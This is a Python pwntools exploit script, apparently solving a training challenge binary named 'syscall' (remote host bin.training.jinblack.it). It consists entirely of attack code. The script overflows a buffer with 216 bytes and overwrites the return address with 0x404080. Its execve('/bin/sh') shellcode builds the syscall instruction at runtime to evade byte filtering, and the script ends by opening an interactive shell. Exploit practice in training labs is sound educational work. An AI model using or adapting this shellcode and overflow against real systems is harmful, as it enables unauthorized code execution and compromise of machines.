from pwn import *
import time

#context.terminal = ['tmux','splitw','-h']

r = process("./syscall")
#r = remote("bin.training.jinblack.it", 3101)
gdb.attach(r, gdbscript="""
      b *(prog+53)
      c
""")
input("wait")

#shellcode = b"\xEB\x1B\x48\x31\xC0\xB0\x3B\x5F\x48\x31\xF6\x48\x31\xD2\x31\xDB\xBB\x04\x0F\x00\x00\x83\xC3\x01\x89\x5C\x24\x08\x90\xE8\xE0\xFF\xFF\xFF/bin/sh\x00"
shellcode = b"\xEB\x24\x48\x31\xC0\xB0\x3B\x5F\x48\x31\xF6\x48\x31\xD2\x31\xDB\xBB\x0E\x05\x00\x00\x83\xC3\x01\x89\x1D\x00\x00\x00\x00\x90\x90\x90\x90\x90\x90\x90\x90\xE8\xD7\xFF\xFF\xFF/bin/sh\x00"
#shellcode = b"B"*50shellcode
#payload = b"A"*216 + p64(0x404080)
payload = shellcode.ljust(216,b"C") + p64(0x404080)

payload = payload.ljust(1000,b"A") #payload.ljust(1000-len(shellcode),b"\x90") + shellcode
#print(payload)
#readcode = b"\x48\x89\xC6\x48\x83\xC6\x11\x48\x31\xC0\x48\x31\xFF\xB2\xFF\x0F\x05"
#shellcode = b"\xEB\x0E\x48\x31\xC0\xB0\x3B\x5F\x48\x31\xF6\x48\x31\xD2\x0F\x05\xE8\xED\xFF\xFF\xFF/bin/sh\x00"
r.send(payload)
#r.send(shellcode)
r.interactive()